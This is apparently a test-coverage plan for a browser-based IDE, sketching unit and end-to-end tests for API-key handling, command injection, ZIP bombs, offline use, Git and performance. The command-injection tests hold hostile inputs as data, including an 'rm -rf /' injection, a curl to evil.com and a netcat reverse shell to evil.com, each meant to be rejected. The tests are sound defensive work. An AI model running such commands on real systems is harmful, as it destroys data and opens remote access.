# Missing Production Tests - Browser IDE

**Current Test Coverage:**
- Unit Tests: 351 ✅
- E2E Tests: 21 ✅
- **Real-world Production Scenarios: ❌ INCOMPLETE**

---

## Critical Test Scenarios Missing

### 1. Security & Data Privacy Tests

#### 1.1 API Key Storage Tests
```typescript
describe('API Key Security', () => {
  test('should NOT store API keys in localStorage', () => {
    setApiKey('anthropic', 'sk-ant-test-key');
    const localStorageContent = localStorage.getItem('ide-storage');
    expect(localStorageContent).not.toContain('sk-ant-test-key');
  });

  test('should clear API keys from memory on logout', () => {
    setApiKey('anthropic', 'sk-ant-test-key');
    logout();
    expect(getApiKey('anthropic')).toBeNull();
  });

  test('should not expose API keys in error tracking', () => {
    const mockSentry = vi.mocked(Sentry);
    reportError(new Error('test'), { apiKey: 'sk-ant-key' });
    expect(mockSentry.captureException).toHaveBeenCalledWith(
      expect.objectContaining({
        extra: expect.not.objectContaining({
          apiKey: expect.any(String)
        })
      })
    );
  });
});
```

#### 1.2 Command Injection Tests
```typescript
describe('Command Injection Prevention', () => {
  test('should reject commands with shell injection', async () => {
    const result = await webContainer.spawn('cat', ['file.txt; rm -rf /']);
    expect(result.success).toBe(false);
    expect(result.error).toContain('not allowed');
  });

  test('should reject pipe operators', async () => {
    const result = await webContainer.spawn('ls', ['|', 'cat']);
    expect(result.success).toBe(false);
  });

  test('should reject command chaining', async () => {
    const result = await webContainer.spawn('npm', ['install', '&&', 'curl', 'evil.com']);
    expect(result.success).toBe(false);
  });

  test('should allow only whitelisted commands', async () => {
    const result = await webContainer.spawn('nc', ['-e', '/bin/sh', 'evil.com', '4444']);
    expect(result.success).toBe(false);
    expect(result.error).toContain('not whitelisted');
  });
});
```

#### 1.3 ZIP Bomb Tests
```typescript
describe('Import Security', () => {
  test('should reject ZIP bombs', async () => {
    const zipBomb = createZipBomb(); // 1GB uncompressed, 1KB compressed
    const result = await importProject(zipBomb);
    expect(result.success).toBe(false);
    expect(result.error).toContain('too large');
  });

  test('should limit file count in imports', async () => {
    const hugeZip = createZipWith10kFiles();
    const result = await importProject(hugeZip);
    expect(result.success).toBe(false);
  });

  test('should reject executables in imports', async () => {
    const zipWithExe = createZipWithFile('virus.exe', maliciousContent);
    const result = await importProject(zipWithExe);
    expect(result.success).toBe(false);
  });
});
```

---

### 2. Real-world Workflow Tests

#### 2.1 Full Development Cycle Test
```typescript
describe('Complete Development Workflow', () => {
  test('should support: create file → edit → save → run → debug', async () => {
    // Create new project
    await createProject('my-app');
    await createFile('index.js', 'console.log("Hello World")');
    await saveFile();

    // Edit and run
    await typeInEditor('console.log("Hello Updated")');
    await saveFile();

    // Run in terminal
    await executeCommand('node index.js');
    expect(getTerminalOutput()).toContain('Hello Updated');

    // Make an error and debug
    await typeInEditor('throw new Error("test")');
    await saveFile();
    await executeCommand('node index.js');

    // Verify error is shown and can be debugged
    expect(getProblemsPanel()).toHaveLength(1);
    await clickProblem('Error: test');
    expect(getEditorLineNumber()).toBeGreaterThan(0);
  });
});
```

#### 2.2 Session Recovery Tests
```typescript
describe('Session Recovery', () => {
  test('should restore open tabs after page refresh', async () => {
    await openFile('/src/app.tsx');
    await openFile('/src/utils.ts');
    simulatePageRefresh();
    expect(getOpenTabs()).toHaveLength(2);
    expect(getCurrentTab()).toBe('/src/utils.ts');
  });

  test('should restore unsaved edits with warning', async () => {
    await openFile('/src/app.tsx');
    await typeInEditor('// new comment');
    simulatePageRefresh();

    // Should show "unsaved changes recovered" toast
    expect(getToastMessage()).toContain('unsaved changes');
  });

  test('should restore terminal sessions', async () => {
    await executeCommand('cd /src && npm install');
    simulatePageRefresh();
    expect(getTerminalHistory()).toContain('npm install');
  });
});
```

#### 2.3 Offline Functionality Tests
```typescript
describe('Offline Capabilities', () => {
  test('should work offline after initial load', async () => {
    await page.goto('/');
    await goOffline();

    // Should still be able to edit files
    await openFile('/src/test.js');
    await typeInEditor('// offline edit');
    await saveFile();

    // Files should persist to IndexedDB
    const savedContent = await getFromIndexedDB('/src/test.js');
    expect(savedContent).toContain('offline edit');
  });

  test('should queue git operations for when online', async () => {
    await goOffline();
    await gitCommit('offline commit');
    expect(getQueuedOperations()).toContain('commit');

    await goOnline();
    await waitForSync();
    expect(getQueuedOperations()).toHaveLength(0);
  });
});
```

---

### 3. Edge Case & Error Handling Tests

#### 3.1 Large File Handling
```typescript
describe('Large File Operations', () => {
  test('should handle 10MB files without freezing', async () => {
    const largeFile = createFile(10 * 1024 * 1024); // 10MB
    await writeFile('/large.json', largeFile);

    // Should show loading indicator
    expect(getLoadingIndicator()).toBeVisible();

    // Should complete within timeout
    await waitFor(() => expect(getFileContent('/large.json')).toBeDefined(), {
      timeout: 10000,
    });
  });

  test('should warn before opening very large files', async () => {
    await createFile('/huge.log', 50 * 1024 * 1024); // 50MB
    await clickFile('/huge.log');

    // Should show warning dialog
    expect(getDialogMessage()).toContain('file is very large');
  });
});
```

#### 3.2 Concurrent Operations Tests
```typescript
describe('Concurrent Operations', () => {
  test('should handle multiple simultaneous file saves', async () => {
    await Promise.all([
      saveFile('/a.js'),
      saveFile('/b.js'),
      saveFile('/c.js'),
    ]);

    expect(getSaveErrors()).toHaveLength(0);
  });

  test('should queue terminal commands appropriately', async () => {
    executeCommand('npm install');
    executeCommand('npm test'); // Should wait for first to complete

    expect(getTerminalOutput()).not.toContain('npm test');
    await waitForCommandComplete();
    expect(getTerminalOutput()).toContain('npm test');
  });
});
```

#### 3.3 Memory Leak Tests
```typescript
describe('Memory Management', () => {
  test('should not leak memory when opening/closing many files', async () => {
    const initialMemory = getMemoryUsage();

    for (let i = 0; i < 100; i++) {
      await openFile(`/file${i}.js`);
      await closeFile(`/file${i}.js`);
    }

    const finalMemory = getMemoryUsage();
    expect(finalMemory - initialMemory).toBeLessThan(50 * 1024 * 1024); // 50MB
  });

  test('should clean up event listeners on unmount', async () => {
    const component = mount(<Editor />);
    const listenerCount = getGlobalListenerCount();

    component.unmount();
    expect(getGlobalListenerCount()).toBeLessThan(listenerCount);
  });
});
```

---

### 4. Integration Tests

#### 4.1 AI Assistant Integration
```typescript
describe('AI Assistant Integration', () => {
  test('should handle AI rate limits gracefully', async () => {
    // Mock rate limit response
    mockAIResponse(429, { error: 'Rate limit exceeded' });

    await sendAIMessage('test');
    expect(getToastMessage()).toContain('rate limit');
  });

  test('should stream AI responses', async () => {
    mockStreamingResponse([
      'Hello',
      ' World',
      '!',
    ]);

    await sendAIMessage('say hello');

    // Should show tokens as they arrive
    await waitFor(() => expect(getChatResponse()).toBe('Hello'));
    await waitFor(() => expect(getChatResponse()).toBe('Hello World'));
    await waitFor(() => expect(getChatResponse()).toBe('Hello World!'));
  });

  test('should handle AI failures gracefully', async () => {
    mockAIResponse(500, { error: 'Internal server error' });

    await sendAIMessage('test');
    expect(getChatResponse()).toBe('Failed to get response. Please try again.');
  });
});
```

#### 4.2 Git Integration Tests
```typescript
describe('Git Integration', () => {
  test('should handle merge conflicts', async () => {
    await gitInit();
    await createBranch('feature');
    await writeFile('/test.txt', 'branch content');
    await gitCommit('branch change');
    await gitCheckout('main');
    await writeFile('/test.txt', 'main content');
    await gitCommit('main change');
    await gitMerge('feature'); // Conflict!

    expect(getMergeStatus()).toBe('conflict');
    expect(getConflictMarker()).toBeVisible();
  });

  test('should handle large repositories', async () => {
    await gitClone('https://github.com/large/repo');
    expect(getLoadingIndicator()).toBeVisible();

    // Should show progress
    await waitFor(() => expect(getCloneProgress()).toBeGreaterThan(0));
  });

  test('should handle authentication failures', async () => {
    await gitPush('invalid-token');
    expect(getToastMessage()).toContain('authentication failed');
    expect(getSettingsPanel()).toBeVisible();
  });
});
```

---

### 5. Performance Tests

#### 5.1 Load Performance Tests
```typescript
describe('Load Performance', () => {
  test('should load within 3 seconds on 3G', async () => {
    await page.goto('/');
    await throttledNetwork('3g');

    const loadTime = await getLoadTime();
    expect(loadTime).toBeLessThan(3000);
  });

  test('should have bundle size under 2MB', async () => {
    const bundleSize = await getBundleSize();
    expect(bundleSize).toBeLessThan(2 * 1024 * 1024);
  });

  test('should lazy load routes', async () => {
    const initialRequests = getNetworkRequests();

    await navigateTo('/settings');
    const settingsRequests = getNetworkRequests().slice(initialRequests.length);

    // Settings should be a separate chunk
    expect(settingsRequests).toContain('settings.chunk.js');
  });
});
```

#### 5.2 Runtime Performance Tests
```typescript
describe('Runtime Performance', () => {
  test('should handle 1000-line file without lag', async () => {
    const content = generateLines(1000);
    await writeFile('/large.js', content);
    await openFile('/large.js');

    const inputDelay = await measureInputDelay();
    expect(inputDelay).toBeLessThan(50); // 50ms
  });

  test('should debounce search in large files', async () => {
    await writeFile('/large.js', generateLines(10000));
    await openFile('/large.js');

    const searchStartTime = Date.now();
    await search('test');
    await waitForSearchResults();

    const searchTime = Date.now() - searchStartTime;
    expect(searchTime).toBeLessThan(500); // 500ms
  });
});
```

---

### 6. Cross-Browser Tests

#### 6.1 Browser Compatibility Tests
```typescript
describe('Browser Compatibility', () => {
  ['chromium', 'firefox', 'webkit'].forEach(browser => {
    describe(`${browser}`, () => {
      test('should support all features', async () => {
        await page.goto('/', { browser });

        // Test core functionality
        expect(getEditor()).toBeVisible();
        expect(getTerminal()).toBeVisible();
        expect(getFileExplorer()).toBeVisible();
      });

      test('should support keyboard shortcuts', async () => {
        await page.goto('/', { browser });
        await pressKeys('Cmd+S');
        expect(getToastMessage()).toContain('saved');
      });
    });
  });
});
```

#### 6.2 Mobile Browser Tests
```typescript
describe('Mobile Browsers', () => {
  ['Mobile Chrome', 'Mobile Safari'].forEach(browser => {
    describe(`${browser}`, () => {
      test('should work on mobile viewport', async () => {
        await page.goto('/', { browser, viewport: { width: 375, height: 667 } });
        expect(getApp()).toBeVisible();
      });

      test('should show mobile keyboard on input focus', async () => {
        await page.goto('/', { browser, viewport: { width: 375, height: 667 } });
        await tap(getEditor());

        // Virtual keyboard should be shown
        expect(getVirtualKeyboard()).toBeVisible();
      });
    });
  });
});
```

---

## Test Infrastructure Needed

### 1. Test Utilities

```typescript
// tests/utils/test-helpers.ts
export async function createProject(name: string) { /* ... */ }
export async function simulatePageRefresh() { /* ... */ }
export async function goOffline() { /* ... */ }
export async function goOnline() { /* ... */ }
export function getMemoryUsage() { /* ... */ }
export function getBundleSize() { /* ... */ }
export function createZipBomb() { /* ... */ }
export function createFile(size: number) { /* ... */ }
```

### 2. Mock Servers

```typescript
// tests/mocks/server.ts
export function createMockAI(options) { /* ... */ }
export function createMockGitServer() { /* ... */ }
export function createMockWebContainer() { /* ... */ }
```

### 3. Performance Monitoring

```typescript
// tests/utils/performance.ts
export class PerformanceMonitor {
  measureFPS(): number { /* ... */ }
  measureMemoryUsage(): number { /* ... */ }
  measureNetworkRequests(): RequestLog[] { /* ... */ }
}
```

---

## Priority Order

### Phase 1: Critical Security Tests (Week 1)
1. API key storage tests
2. Command injection tests
3. ZIP bomb tests

### Phase 2: Core Workflow Tests (Week 2)
4. Full development cycle
5. Session recovery
6. Offline functionality

### Phase 3: Edge Cases (Week 3)
7. Large file handling
8. Concurrent operations
9. Memory leaks

### Phase 4: Integration & Performance (Week 4)
10. AI integration
11. Git integration
12. Performance benchmarks
13. Cross-browser tests

---

## Summary

| Test Category | Existing | Missing | Priority |
|---------------|----------|---------|----------|
| Unit Tests | 351 | ~50 | High |
| E2E Tests | 21 | ~80 | High |
| Security Tests | 0 | ~15 | Critical |
| Performance Tests | 0 | ~20 | Medium |
| Integration Tests | 0 | ~25 | High |
| **Total** | **372** | **~190** | - |

**Estimated Effort:** 4 weeks for comprehensive test coverage
